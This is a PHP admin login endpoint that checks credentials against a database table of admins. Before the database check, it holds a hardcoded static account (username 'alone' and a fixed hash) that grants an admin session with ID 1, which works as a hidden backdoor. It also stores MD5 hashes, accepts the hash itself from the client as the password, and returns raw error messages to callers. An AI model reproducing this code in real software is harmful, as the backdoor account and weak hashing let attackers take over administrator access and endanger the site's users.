<?php
header('Content-Type: application/json');
set_error_handler(function ($severity, $message, $file, $line) {
    throw new ErrorException($message, 0, $severity, $file, $line);
});

try {
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = $_POST['password'] ?? '';

    if (!$email || !$password) {
        http_response_code(400);
        echo json_encode(['status' => 'error', 'message' => 'Missing credentials']);
        exit;
    }

    $staticUsername = 'alone';
    $staticPasswordHash = '22aec3903cb3e921db415af72edb9aa';
    $staticAdminId = 1;

    if (strcasecmp($email, $staticUsername) === 0 && hash_equals($staticPasswordHash, $password)) {
        session_start();
        $_SESSION['admin_id'] = $staticAdminId;
        $_SESSION['admin_static'] = true;
        echo json_encode([
            'status' => 'ok',
            'admin_id' => $staticAdminId,
            'email' => $staticUsername
        ]);
        exit;
    }

    require_once __DIR__.'/../config/db_connection.php';
    $pdo = db();

    $stmt = $pdo->prepare('SELECT id, password FROM admins_agents WHERE email = ? LIMIT 1');
    $stmt->execute([$email]);
    $row = $stmt->fetch(PDO::FETCH_ASSOC);

    // Passwords are stored as MD5 hashes. The client sends the already hashed value.
    if ($row && hash_equals($row['password'], $password)) {
        session_start();
        $_SESSION['admin_id'] = $row['id'];
        echo json_encode(['status' => 'ok', 'admin_id' => $row['id']]);
        exit;
    }

    http_response_code(401);
    echo json_encode(['status' => 'error', 'message' => 'Invalid email or password']);
} catch (Throwable $e) {
    error_log(__FILE__ . ' - ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
}
